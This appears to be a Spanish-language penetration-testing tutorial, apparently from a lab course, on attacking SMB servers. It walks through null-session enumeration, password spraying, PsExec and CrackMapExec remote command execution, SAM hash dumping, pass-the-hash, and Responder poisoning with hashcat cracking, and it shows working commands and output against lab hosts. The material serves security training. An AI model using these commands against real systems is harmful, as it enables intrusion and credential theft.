
# Ataques a SMB

Server Message Block (SMB) es un protocolo de comunicación creado para proporcionar acceso compartido a archivos e impresoras entre nodos de una red. Inicialmente, fue diseñado para ejecutarse sobre NetBIOS sobre TCP/IP (NBT) usando el puerto TCP `139` y los puertos UDP `137` y `138`. Sin embargo, con Windows 2000, Microsoft agregó la opción de ejecutar SMB directamente sobre TCP/IP en el puerto `445` sin la capa NetBIOS adicional. Hoy en día, los sistemas operativos Windows modernos utilizan SMB sobre TCP pero aún admiten la implementación de NetBIOS como conmutación por error.

Otro protocolo que comúnmente se relaciona con SMB es [MSRPC (Llamada a procedimiento remoto de Microsoft)](https://en.wikipedia.org/wiki/Microsoft_RPC) . RPC proporciona al desarrollador de aplicaciones una forma genérica de ejecutar un procedimiento (también conocido como función) en un proceso local o remoto sin tener que comprender los protocolos de red utilizados para admitir la comunicación, como se especifica en [MS-RPCE](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rpce/290c38b1-92fe-4229-91e6-4fc376610c15) , que define un protocolo RPC sobre SMB. que puede utilizar canalizaciones con nombre del protocolo SMB como transporte subyacente.

***

## <mark style="color:purple;">Enumeración</mark>

Dependiendo de la implementación de SMB y del sistema operativo, obtendremos información diferente usando `Nmap`. Tenga en cuenta que cuando se selecciona el sistema operativo Windows, la información de la versión generalmente no se incluye como parte de los resultados del análisis de Nmap. En cambio, Nmap intentará adivinar la versión del sistema operativo. Sin embargo, a menudo necesitaremos otros análisis para identificar si el objetivo es vulnerable a un exploit en particular. Cubriremos la búsqueda de vulnerabilidades conocidas más adelante en esta sección. Por ahora, escaneemos los puertos `139 y 445 TCP`.

```shell-session
afsh4ck@kali$ sudo nmap 10.129.14.128 -sV -sC -p139,445

Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-19 15:15 CEST
Nmap scan report for 10.129.14.128
Host is up (0.00024s latency).

PORT    STATE SERVICE     VERSION
139/tcp open  netbios-ssn Samba smbd 4.6.2
445/tcp open  netbios-ssn Samba smbd 4.6.2
MAC Address: 00:00:00:00:00:00 (VMware)

Host script results:
|_nbstat: NetBIOS name: HTB, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-09-19T13:16:04
|_  start_date: N/A
```

El escaneo de Nmap revela información esencial sobre el objetivo:

* Versión SMB (Samba smbd 4.6.2)
* Nombre de host HTB
* El sistema operativo es Linux basado en la implementación de SMB.

Exploremos algunas configuraciones erróneas comunes y ataques específicos de protocolos.

***

## <mark style="color:purple;">Configuraciones erróneas</mark>

SMB se puede configurar para que no requiera autenticación, lo que a menudo se denomina `null session`. En cambio, podemos iniciar sesión en un sistema sin nombre de usuario ni contraseña.

### **Autenticación anónima**

Si encontramos un servidor SMB que no requiere un nombre de usuario y contraseña o encontramos credenciales válidas, podemos obtener una lista de recursos compartidos, nombres de usuarios, grupos, permisos, políticas, servicios, etc. La mayoría de las herramientas que interactúan con SMB permiten conectividad de sesión nula, incluyendo `smbclient`, `smbmap`, `rpcclient`, o `enum4linux`. Exploremos cómo podemos interactuar con archivos compartidos y RPC usando autenticación nula.

### **Recursos compartidos**

Usando `smbclient` podemos mostrar una lista de los recursos compartidos del servidor con la opción `-L`, y usando la opción `-N` le decimos que `smbclient` use la sesión nula.

```shell-session
afsh4ck@kali$ smbclient -N -L //10.129.14.128

        Sharename       Type      Comment
        -------      --     -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        notes           Disk      CheckIT
        IPC$            IPC       IPC Service (DEVSM)
SMB1 disabled no workgroup available
```

`Smbmap` es otra herramienta que nos ayuda a enumerar recursos compartidos de red y acceder a los permisos asociados. Una ventaja de `smbmap` es que proporciona una lista de permisos para cada carpeta compartida.

```shell-session
afsh4ck@kali$ smbmap -H 10.129.14.128

[+] IP: 10.129.14.128:445     Name: 10.129.14.128                                   
        Disk                                                    Permissions     Comment
        --                                                   ---------    -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       IPC Service (DEVSM)
        notes                                                   READ, WRITE     CheckIT
```

Usando la opción `-r` o `-R`(recursiva) en `smbmap`, se puede navegar por los directorios:

```shell-session
afsh4ck@kali$ smbmap -H 10.129.14.128 -r notes

[+] Guest session       IP: 10.129.14.128:445    Name: 10.129.14.128                           
        Disk                                                    Permissions     Comment
        --                                                   ---------    -------
        notes                                                   READ, WRITE
        .\notes\*
        dr--r--r               0 Mon Nov  2 00:57:44 2020    .
        dr--r--r               0 Mon Nov  2 00:57:44 2020    ..
        dr--r--r               0 Mon Nov  2 00:57:44 2020    LDOUJZWBSG
        fw--w--w             116 Tue Apr 16 07:43:19 2019    note.txt
        fr--r--r               0 Fri Feb 22 07:43:28 2019    SDT65CB.tmp
        dr--r--r               0 Mon Nov  2 00:54:57 2020    TPLRNSMWHQ
        dr--r--r               0 Mon Nov  2 00:56:51 2020    WDJEQFZPNO
        dr--r--r               0 Fri Feb 22 07:44:02 2019    WindowsImageBackup
```

En el ejemplo anterior, los permisos están configurados en `READ`y `WRITE`, que se pueden usar para cargar y descargar archivos.

```shell-session
afsh4ck@kali$ smbmap -H 10.129.14.128 --download "notes\note.txt"

[+] Starting download: notes\note.txt (116 bytes)
[+] File output to: /htb/10.129.14.128-notes_note.txt
```

```shell-session
afsh4ck@kali$ smbmap -H 10.129.14.128 --upload test.txt "notes\test.txt"

[+] Starting upload: test.txt (20 bytes)
[+] Upload complete.
```

### **Remote Procedure Call (RPC)**

Podemos utilizar  `rpcclient` con una sesión nula para enumerar una estación de trabajo o controlador de dominio.

`rpcclient` nos ofrece muchos comandos diferentes para ejecutar funciones específicas en el servidor SMB para recopilar información o modificar atributos del servidor como un nombre de usuario. Podemos utilizar esta [hoja de referencia del Instituto SANS](https://www.willhackforsushi.com/sec504/SMB-Access-from-Linux.pdf) o revisar la lista completa de todas estas funciones que se encuentra en la [página de manual](https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html) del archivo `rpcclient`.

```shell-session
afsh4ck@kali$ rpcclient -U'%' 10.10.110.17

rpcclient $> enumdomusers

user:[mhope] rid:[0x641]
user:[svc-ata] rid:[0xa2b]
user:[svc-bexec] rid:[0xa2c]
user:[roleary] rid:[0xa36]
user:[smorgan] rid:[0xa37]
```

`Enum4linux`es otra utilidad que admite sesiones nulas y utiliza `nmblookup`, `net`, `rpcclient`y `smbclient`para automatizar algunas enumeraciones comunes de objetivos SMB como:

* Grupo de trabajo/nombre de dominio
* Información de usuarios
* Información del sistema operativo
* Información de grupos
* Carpetas compartidas
* Información de política de contraseñas

La [herramienta original](https://github.com/CiscoCXSecurity/enum4linux) fue escrita en Perl y [reescrita por Mark Lowe en Python](https://github.com/cddmp/enum4linux-ng) .

```shell-session
afsh4ck@kali$ ./enum4linux-ng.py 10.10.11.45 -A -C

ENUM4LINUX - next generation

 ==========================
|    Target Information    |
 ==========================
[*] Target ........... 10.10.11.45
[*] Username ......... ''
[*] Random Username .. 'noyyglci'
[*] Password ......... ''

 ====================================
|    Service Scan on 10.10.11.45     |
 ====================================
[*] Checking LDAP (timeout: 5s)
[-] Could not connect to LDAP on 389/tcp: connection refused
[*] Checking LDAPS (timeout: 5s)
[-] Could not connect to LDAPS on 636/tcp: connection refused
[*] Checking SMB (timeout: 5s)
[*] SMB is accessible on 445/tcp
[*] Checking SMB over NetBIOS (timeout: 5s)
[*] SMB over NetBIOS is accessible on 139/tcp

 ===================================================                            
|    NetBIOS Names and Workgroup for 10.10.11.45    |
 ===================================================                                                                                         
[*] Got domain/workgroup name: WORKGROUP
[*] Full NetBIOS names information:
- WIN-752039204 <00> -          B <ACTIVE>  Workstation Service
- WORKGROUP     <00> -          B <ACTIVE>  Workstation Service
- WIN-752039204 <20> -          B <ACTIVE>  Workstation Service
- MAC Address = 00-0C-29-D7-17-DB
...
 ========================================
|    SMB Dialect Check on 10.10.11.45    |
 ========================================

<SNIP>
```

***

## <mark style="color:purple;">Ataques específicos del protocolo</mark>

Si no se habilita una sesión nula, necesitaremos credenciales para interactuar con el protocolo SMB. Dos formas comunes de obtener credenciales son [la fuerza bruta](https://en.wikipedia.org/wiki/Brute-force_attack) y [la pulverización de contraseñas](https://owasp.org/www-community/attacks/Password_Spraying_Attack) .

### **Fuerza bruta y Password Spraying**

Cuando utilizamos la fuerza bruta, probamos tantas contraseñas como sea posible en una cuenta, pero podemos bloquearla si alcanzamos el umbral. Podemos utilizar la fuerza bruta y detenernos antes de alcanzar el umbral si lo sabemos. De lo contrario, no recomendamos utilizar la fuerza bruta.

La pulverización de contraseñas es una mejor alternativa ya que podemos apuntar a una lista de nombres de usuario con una contraseña común para evitar bloqueos de cuentas. Podemos probar más de una contraseña si conocemos el umbral de bloqueo de la cuenta. Normalmente, dos o tres intentos son seguros, siempre que esperemos entre 30 y 60 minutos entre intentos. Exploremos la herramienta [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec) que incluye la capacidad de ejecutar la pulverización de contraseñas.

Con CrackMapExec (CME), podemos apuntar a múltiples IP, utilizando numerosos usuarios y contraseñas. Exploremos un caso de uso cotidiano para la pulverización de contraseñas. Para realizar una pulverización de contraseña contra una IP, podemos usar la opción `-u` para especificar un archivo con una lista de usuarios y `-p` para especificar una contraseña. Esto intentará autenticar a todos los usuarios de la lista utilizando la contraseña proporcionada.

```shell-session
afsh4ck@kali$ cat /tmp/userlist.txt

Administrator
jrodriguez 
admin
<SNIP>
jurena
```

#### Password Spraying

```shell-session
afsh4ck@kali$ crackmapexec smb 10.10.110.17 -u /tmp/userlist.txt -p 'Company01!' --local-auth

SMB         10.10.110.17 445    WIN7BOX  [*] Windows 10.0 Build 18362 (name:WIN7BOX) (domain:WIN7BOX) (signing:False) (SMBv1:False)
SMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\Administrator:Company01! STATUS_LOGON_FAILURE 
SMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\jrodriguez:Company01! STATUS_LOGON_FAILURE 
SMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\admin:Company01! STATUS_LOGON_FAILURE 
SMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\eperez:Company01! STATUS_LOGON_FAILURE 
SMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\amone:Company01! STATUS_LOGON_FAILURE 
SMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\fsmith:Company01! STATUS_LOGON_FAILURE 
SMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\tcrash:Company01! STATUS_LOGON_FAILURE 

<SNIP>

SMB         10.10.110.17 445    WIN7BOX  [+] WIN7BOX\jurena:Company01! (Pwn3d!) 
```

{% hint style="info" %}
**Nota**: De forma predeterminada, CME se cerrará después de que se encuentre un inicio de sesión exitoso. El uso de la opción `--continue-on-success` continuará apareciendo incluso después de que se encuentre una contraseña válida. Es muy útil para asignar una única contraseña a una gran lista de usuarios. Además, si nos dirigimos a una computadora que no está unida a un dominio, necesitaremos usar la opción `--local-auth`. Para obtener un estudio más detallado sobre la pulverización de contraseñas, consulte el módulo Enumeración y ataques de Active Directory.
{% endhint %}

Para obtener instrucciones de uso más detalladas, consulte la [guía de documentación](https://web.archive.org/web/20220129050920/https://mpgn.gitbook.io/crackmapexec/getting-started/using-credentials) de la herramienta .

### **SMB**

Los servidores SMB de Linux y Windows ofrecen diferentes rutas de ataque. Por lo general, solo obtendremos acceso al sistema de archivos, abusaremos de privilegios o explotaremos vulnerabilidades conocidas en un entorno Linux, como veremos más adelante en esta sección. Sin embargo, en Windows, la superficie de ataque es más significativa.

Al atacar un servidor SMB de Windows, nuestras acciones estarán limitadas por los privilegios que teníamos sobre el usuario que logramos comprometer. Si este usuario es Administrador o tiene privilegios específicos podremos realizar operaciones como:

* Ejecución remota de comandos
* Extraer hashes de la base de datos SAM
* Enumeración de usuarios conectados
* Pasar el hash (PTH)

Analicemos cómo podemos realizar tales operaciones. Además, aprenderemos cómo se puede abusar del protocolo SMB para recuperar el hash de un usuario como método para escalar privilegios u obtener acceso a una red.

### **Ejecución remota de código (RCE)**

Antes de pasar a cómo ejecutar un comando en un sistema remoto usando SMB, hablemos de Sysinternals. El sitio web Windows Sysinternals fue creado en 1996 por [Mark Russinovich](https://en.wikipedia.org/wiki/Mark_Russinovich) y [Bryce Cogswell](https://en-academic.com/dic.nsf/enwiki/2358707) para ofrecer recursos técnicos y utilidades para administrar, diagnosticar, solucionar problemas y monitorear un entorno de Microsoft Windows. Microsoft adquirió Windows Sysinternals y sus activos el 18 de julio de 2006.

Sysinternals presentó varias herramientas gratuitas para administrar y monitorear computadoras que ejecutan Microsoft Windows. El software ahora se puede encontrar en el [sitio web de Microsoft](https://docs.microsoft.com/en-us/sysinternals/) . Una de esas herramientas gratuitas para administrar sistemas remotos es PsExec.

[PsExec](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec) es una herramienta que nos permite ejecutar procesos en otros sistemas, con total interactividad para aplicaciones de consola, sin tener que instalar el software cliente manualmente. Funciona porque tiene una imagen de servicio de Windows dentro de su ejecutable. Toma este servicio y lo implementa en el recurso compartido admin$ (de forma predeterminada) en la máquina remota. Luego utiliza la interfaz DCE/RPC a través de SMB para acceder a la API del Administrador de control de servicios de Windows. A continuación, inicia el servicio PSExec en la máquina remota. Luego, el servicio PSExec crea una [canalización con nombre](https://docs.microsoft.com/en-us/windows/win32/ipc/named-pipes) que puede enviar comandos al sistema.

Podemos descargar PsExec desde [el sitio web de Microsoft](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec) , o podemos usar algunas implementaciones de Linux:

* [Impacket PsExec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py) : ejemplo de funcionalidad similar a Python PsExec usando [RemComSvc](https://github.com/kavika13/RemCom) .
* [Impacket SMBExec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbexec.py) : un enfoque similar a PsExec sin utilizar [RemComSvc](https://github.com/kavika13/RemCom) . La técnica se describe aquí. Esta implementación va un paso más allá y crea una instancia de un servidor SMB local para recibir el resultado de los comandos. Esto es útil cuando la máquina de destino NO tiene un recurso compartido grabable disponible.
* [Impacket atexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/atexec.py) : este ejemplo ejecuta un comando en la máquina de destino a través del servicio Programador de tareas y devuelve el resultado del comando ejecutado.
* [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec) : incluye una implementación de `smbexec`y `atexec`.
* [Metasploit PsExec](https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/exploit/windows/smb/psexec.md) : implementación de Ruby PsExec.

### **Impacket PsExec**

Para usar `impacket-psexec`, debemos proporcionar el dominio/nombre de usuario, la contraseña y la dirección IP de nuestra máquina de destino. Para obtener información más detallada podemos utilizar la ayuda de impacket:

```shell-session
afsh4ck@kali$ impacket-psexec -h

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

usage: psexec.py [-h] [-c pathname] [-path PATH] [-file FILE] [-ts] [-debug] [-hashes LMHASH:NTHASH] [-no-pass] [-k] [-aesKey hex key] [-keytab KEYTAB] [-dc-ip ip address]
                 [-target-ip ip address] [-port [destination port]] [-service-name service_name] [-remote-binary-name remote_binary_name]
                 target [command ...]

PSEXEC like functionality example using RemComSvc.

positional arguments:
  target                [[domain/]username[:password]@]<targetName or address>
  command               command (or arguments if -c is used) to execute at the target (w/o path) - (default:cmd.exe)

optional arguments:
  -h, --help            show this help message and exit
  -c pathname           copy the filename for later execution, arguments are passed in the command option
  -path PATH            path of the command to execute
  -file FILE            alternative RemCom binary (be sure it doesn't require CRT)
  -ts                   adds timestamp to every logging output
  -debug                Turn DEBUG output ON

authentication:
  -hashes LMHASH:NTHASH
                        NTLM hashes, format is LMHASH:NTHASH
  -no-pass              don't ask for password (useful for -k)
  -k                    Use Kerberos authentication. Grabs credentials from ccache file (KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use the
                        ones specified in the command line
  -aesKey hex key       AES key to use for Kerberos Authentication (128 or 256 bits)
  -keytab KEYTAB        Read keys for SPN from keytab file

connection:
  -dc-ip ip address     IP Address of the domain controller. If omitted it will use the domain part (FQDN) specified in the target parameter
  -target-ip ip address
                        IP Address of the target machine. If omitted it will use whatever was specified as target. This is useful when target is the NetBIOS name and you cannot resolve
                        it
  -port [destination port]
                        Destination port to connect to SMB Server
  -service-name service_name
                        The name of the service used to trigger the payload
  -remote-binary-name remote_binary_name
                        This will be the name of the executable uploaded on the target
```

Para conectarse a una máquina remota con una cuenta de administrador local, usando `impacket-psexec`, puede usar el siguiente comando:

```shell-session
afsh4ck@kali$ impacket-psexec administrator:'Password123!'@10.10.110.17

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Requesting shares on 10.10.110.17.....
[*] Found writable share ADMIN$
[*] Uploading file EHtJXgng.exe
[*] Opening SVCManager on 10.10.110.17.....
[*] Creating service nbAc on 10.10.110.17.....
[*] Starting service nbAc.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.19041.1415]
(c) Microsoft Corporation. All rights reserved.


C:\Windows\system32>whoami && hostname

nt authority\system
WIN7BOX
```

Las mismas opciones se aplican a `impacket-smbexec` y  `impacket-atexec`.

### **CrackMapExec**

Otra herramienta que podemos utilizar para ejecutar CMD o PowerShell es `CrackMapExec`. Una ventaja `CrackMapExec`es la disponibilidad para ejecutar un comando en varios hosts a la vez. Para usarlo, debemos especificar el protocolo `smb`, la dirección IP o el rango de direcciones IP, la opción `-u` de nombre de usuario y `-p` contraseña, y la opción `-x` de ejecutar comandos cmd o mayúsculas `-X` para ejecutar comandos de PowerShell.

```shell-session
afsh4ck@kali$ crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec

SMB         10.10.110.17 445    WIN7BOX  [*] Windows 10.0 Build 19041 (name:WIN7BOX) (domain:.) (signing:False) (SMBv1:False)
SMB         10.10.110.17 445    WIN7BOX  [+] .\Administrator:Password123! (Pwn3d!)
SMB         10.10.110.17 445    WIN7BOX  [+] Executed command via smbexec
SMB         10.10.110.17 445    WIN7BOX  nt authority\system
```

{% hint style="info" %}
**Nota**: Si `--exec-method`no está definido, CrackMapExec intentará ejecutar el método atexec; si falla, puede intentar especificar `--exec-method`smbexec.
{% endhint %}

### **Enumeración de usuarios logueados**

Imaginemos que estamos en una red con varias máquinas. Algunos de ellos comparten la misma cuenta de administrador local. En este caso, podríamos utilizar `CrackMapExec` para enumerar los usuarios que han iniciado sesión en todas las máquinas dentro de la misma red `10.10.110.17/24`, lo que acelera nuestro proceso de enumeración.

```shell-session
afsh4ck@kali$ crackmapexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users

SMB         10.10.110.17 445    WIN7BOX  [*] Windows 10.0 Build 18362 (name:WIN7BOX) (domain:WIN7BOX) (signing:False) (SMBv1:False)
SMB         10.10.110.17 445    WIN7BOX  [+] WIN7BOX\administrator:Password123! (Pwn3d!)
SMB         10.10.110.17 445    WIN7BOX  [+] Enumerated loggedon users
SMB         10.10.110.17 445    WIN7BOX  WIN7BOX\Administrator             logon_server: WIN7BOX
SMB         10.10.110.17 445    WIN7BOX  WIN7BOX\jurena                    logon_server: WIN7BOX
SMB         10.10.110.21 445    WIN10BOX  [*] Windows 10.0 Build 19041 (name:WIN10BOX) (domain:WIN10BOX) (signing:False) (SMBv1:False)
SMB         10.10.110.21 445    WIN10BOX  [+] WIN10BOX\Administrator:Password123! (Pwn3d!)
SMB         10.10.110.21 445    WIN10BOX  [+] Enumerated loggedon users
SMB         10.10.110.21 445    WIN10BOX  WIN10BOX\demouser                logon_server: WIN10BOX
```

### **Extraer hashes de la base de datos SAM**

El Administrador de cuentas de seguridad (SAM) es un archivo de base de datos que almacena las contraseñas de los usuarios. Se puede utilizar para autenticar usuarios locales y remotos. Si obtenemos privilegios administrativos en una máquina, podemos extraer los hashes de la base de datos SAM para diferentes propósitos:

* Autenticarse como otro usuario.
* Cracking de contraseñas: si logramos descifrar la contraseña, podemos intentar reutilizarla para otros servicios o cuentas.
* Pass the Hash: Lo discutiremos más adelante en esta sección.

```shell-session
afsh4ck@kali$ crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam

SMB         10.10.110.17 445    WIN7BOX  [*] Windows 10.0 Build 18362 (name:WIN7BOX) (domain:WIN7BOX) (signing:False) (SMBv1:False)
SMB         10.10.110.17 445    WIN7BOX  [+] WIN7BOX\administrator:Password123! (Pwn3d!)
SMB         10.10.110.17 445    WIN7BOX  [+] Dumping SAM hashes
SMB         10.10.110.17 445    WIN7BOX  Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
SMB         10.10.110.17 445    WIN7BOX  Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.10.110.17 445    WIN7BOX  DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.10.110.17 445    WIN7BOX  WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:5717e1619e16b9179ef2e7138c749d65:::
SMB         10.10.110.17 445    WIN7BOX  jurena:1001:aad3b435b51404eeaad3b435b51404ee:209c6174da490caeb422f3fa5a7ae634:::
SMB         10.10.110.17 445    WIN7BOX  demouser:1002:aad3b435b51404eeaad3b435b51404ee:4c090b2a4a9a78b43510ceec3a60f90b:::
SMB         10.10.110.17 445    WIN7BOX  [+] Added 6 SAM hashes to the database
```

### **Pass the Hash (PtH)**

Si logramos obtener un hash NTLM de un usuario y no podemos descifrarlo, aún podemos usar el hash para autenticarnos a través de SMB con una técnica llamada Pass-the-Hash (PtH). PtH permite a un atacante autenticarse en un servidor o servicio remoto utilizando el hash NTLM subyacente de la contraseña de un usuario en lugar de la contraseña en texto plano. Podemos utilizar un ataque PtH con cualquier herramienta cómo `Impacket`, `SMBMap`, `CrackMapExec`, entre otras. A continuación se muestra un ejemplo de cómo funcionaría esto con `CrackMapExec`:

```shell-session
afsh4ck@kali$ crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE

SMB         10.10.110.17 445    WIN7BOX  [*] Windows 10.0 Build 19041 (name:WIN7BOX) (domain:WIN7BOX) (signing:False) (SMBv1:False)
SMB         10.10.110.17 445    WIN7BOX  [+] WIN7BOX\Administrator:2B576ACBE6BCFDA7294D6BD18041B8FE (Pwn3d!)
```

### **Ataques de autenticación forzada**

También podemos abusar del protocolo SMB creando un servidor SMB falso para capturar [los hashes NetNTLM v1/v2](https://medium.com/@petergombos/lm-ntlm-net-ntlmv2-oh-my-a9b235c58ed4) de los usuarios .

La herramienta más común para realizar este tipo de operaciones es `Responder`. [Responder](https://github.com/lgandx/Responder) es una herramienta de envenenamiento LLMNR, NBT-NS y MDNS con diferentes capacidades, una de ellas es la posibilidad de configurar servicios falsos, incluido SMB, para robar hashes NetNTLM v1/v2. En su configuración predeterminada, encontrará tráfico LLMNR y NBT-NS. Luego, responderá en nombre de los servidores que la víctima está buscando y capturará sus hashes NetNTLM.

Ilustremos un ejemplo para entender mejor cómo funciona `Responder`. Imaginemos que creamos un servidor SMB falso usando la configuración predeterminada de Responder, con el siguiente comando:

```shell-session
afsh4ck@kali$ responder -I <interface name>
```

Cuando un usuario o un sistema intenta realizar una resolución de nombre (NR), una máquina lleva a cabo una serie de procedimientos para recuperar la dirección IP de un host por su nombre de host. En máquinas con Windows, el procedimiento será aproximadamente el siguiente:

* Se requiere la dirección IP del recurso compartido de archivos del nombre de host.
* Se comprobará si hay registros adecuados en el archivo del host local (C:\Windows\System32\Drivers\etc\hosts).
* Si no se encuentran registros, la máquina cambia al caché DNS local, que realiza un seguimiento de los nombres resueltos recientemente.
* ¿No hay ningún registro DNS local? Se enviará una consulta al servidor DNS que se haya configurado.
* Si todo lo demás falla, la máquina emitirá una consulta de multidifusión, solicitando la dirección IP del archivo compartido de otras máquinas en la red.

Supongamos que un usuario escribió mal el nombre de una carpeta compartida `\\mysharefoder\`en lugar de `\\mysharedfolder\`. En ese caso, todas las resoluciones de nombres fallarán porque el nombre no existe y la máquina enviará una consulta de multidifusión a todos los dispositivos de la red, incluidos nosotros que ejecutamos nuestro servidor SMB falso. Esto es un problema porque no se toman medidas para verificar la integridad de las respuestas. Los atacantes pueden aprovechar este mecanismo escuchando dichas consultas y falsificando respuestas, lo que lleva a la víctima a creer que los servidores maliciosos son dignos de confianza. Esta confianza se suele utilizar para robar credenciales.

```shell-session
afsh4ck@kali$ sudo responder -I ens33

                                         __               
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|              

           NBT-NS, LLMNR & MDNS Responder 3.0.6.0
               
  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C

[+] Poisoners:                
    LLMNR                      [ON]
    NBT-NS                     [ON]        
    DNS/MDNS                   [ON]   
                                                                                                                                                                                          
[+] Servers:         
    HTTP server                [ON]                                   
    HTTPS server               [ON]
    WPAD proxy                 [OFF]                                  
    Auth proxy                 [OFF]
    SMB server                 [ON]                                   
    Kerberos server            [ON]                                   
    SQL server                 [ON]                                   
    FTP server                 [ON]                                   
    IMAP server                [ON]                                   
    POP3 server                [ON]                                   
    SMTP server                [ON]                                   
    DNS server                 [ON]                                   
    LDAP server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]                                   
                                                                                   
[+] HTTP Options:                                                                  
    Always serving EXE         [OFF]                                               
    Serving EXE                [OFF]                                               
    Serving HTML               [OFF]                                               
    Upstream Proxy             [OFF]                                               

[+] Poisoning Options:                                                             
    Analyze Mode               [OFF]                                               
    Force WPAD auth            [OFF]                                               
    Force Basic Auth           [OFF]                                               
    Force LM downgrade         [OFF]                                               
    Fingerprint hosts          [OFF]                                               

[+] Generic Options:                                                               
    Responder NIC              [tun0]                                              
    Responder IP               [10.10.14.198]                                      
    Challenge set              [random]                                            
    Don't Respond To Names     ['ISATAP']                                          

[+] Current Session Variables:                                                     
    Responder Machine Name     [WIN-2TY1Z1CIGXH]   
    Responder Domain Name      [HF2L.LOCAL]                                        
    Responder DCE-RPC Port     [48162] 

[+] Listening for events... 

[*] [NBT-NS] Poisoned answer sent to 10.10.110.17 for name WORKGROUP (service: Domain Master Browser)
[*] [NBT-NS] Poisoned answer sent to 10.10.110.17 for name WORKGROUP (service: Browser Election)
[*] [MDNS] Poisoned answer sent to 10.10.110.17   for name mysharefoder.local
[*] [LLMNR]  Poisoned answer sent to 10.10.110.17 for name mysharefoder
[*] [MDNS] Poisoned answer sent to 10.10.110.17   for name mysharefoder.local
[SMB] NTLMv2-SSP Client   : 10.10.110.17
[SMB] NTLMv2-SSP Username : WIN7BOX\demouser
[SMB] NTLMv2-SSP Hash     : demouser::WIN7BOX:997b18cc61099ba2:3CC46296B0CCFC7A231D918AE1DAE521:0101000000000000B09B51939BA6D40140C54ED46AD58E890000000002000E004E004F004D00410054004300480001000A0053004D0042003100320004000A0053004D0042003100320003000A0053004D0042003100320005000A0053004D0042003100320008003000300000000000000000000000003000004289286EDA193B087E214F3E16E2BE88FEC5D9FF73197456C9A6861FF5B5D3330000000000000000
```

Estas credenciales capturadas se pueden descifrar mediante [hashcat](https://hashcat.net/hashcat/) o transmitirse a un host remoto para completar la autenticación y hacerse pasar por el usuario.

Todos los Hashes guardados se encuentran en el directorio de registros de Responder ( `/usr/share/responder/logs/`). Podemos copiar el hash a un archivo e intentar descifrarlo usando el módulo hashcat 5600.

{% hint style="info" %}
**Nota**: Si observa varios hashes para una cuenta, esto se debe a que NTLMv2 utiliza un challenge tanto del lado del cliente como del lado del servidor que es aleatorio para cada interacción. Esto hace que los hashes resultantes que se envían se agreguen una cadena aleatoria de números. Es por eso que los hashes no coinciden pero siguen representando la misma contraseña.
{% endhint %}

{% code overflow="wrap" %}

```shell-session
afsh4ck@kali$ hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt

hashcat (v6.1.1) starting...

<SNIP>

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344386
* Bytes.....: 139921355
* Keyspace..: 14344386

ADMINISTRATOR::WIN-487IMQOIA8E:997b18cc61099ba2:3cc46296b0ccfc7a231d918ae1dae521:0101000000000000b09b51939ba6d40140c54ed46ad58e890000000002000e004e004f004d00410054004300480001000a0053004d0042003100320004000a0053004d0042003100320003000a0053004d0042003100320005000a0053004d0042003100320008003000300000000000000000000000003000004289286eda193b087e214f3e16e2be88fec5d9ff73197456c9a6861ff5b5d3330000000000000000:P@ssword
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: NetNTLMv2
Hash.Target......: ADMINISTRATOR::WIN-487IMQOIA8E:997b18cc61099ba2:3cc...000000
Time.Started.....: Mon Apr 11 16:49:34 2022 (1 sec)
Time.Estimated...: Mon Apr 11 16:49:35 2022 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1122.4 kH/s (1.34ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 75776/14344386 (0.53%)
Rejected.........: 0/75776 (0.00%)
Restore.Point....: 73728/14344386 (0.51%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: compu -> kodiak1

Started: Mon Apr 11 16:49:34 2022
Stopped: Mon Apr 11 16:49:37 2022
